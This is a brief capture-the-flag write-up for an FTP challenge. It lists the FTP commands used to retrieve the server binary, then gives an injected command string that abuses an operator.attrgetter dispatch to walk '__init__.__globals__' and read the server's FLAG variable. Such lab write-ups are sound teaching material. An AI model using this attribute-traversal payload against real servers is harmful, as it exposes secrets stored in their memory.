# Solution

## Getting the Source File

Command reference: <https://en.wikipedia.org/wiki/List_of_FTP_commands>

```text
LIST
CWD chal
LIST
RETR pwn
```

`RETR flag.txt` does not work, look at the source code for explanation

## Getting the Flag

Based on <https://docs.python.org/3/library/operator.html#operator.attrgetter>

```py
class A:
    def __init__(self, cmd, args):
        f = operator.attrgetter(cmd)(self) 
        f(args)

A("foo.bar", "baz")
```

is equivalent to

```py
A.foo.bar("baz")
```

Thus, to get the flag:

```text
__init__.__globals__.__getitem__ FLAG
```

which is equivalent to

```py
FTPServerThread.__init__.__globals__.__getitem__("FLAG")
```
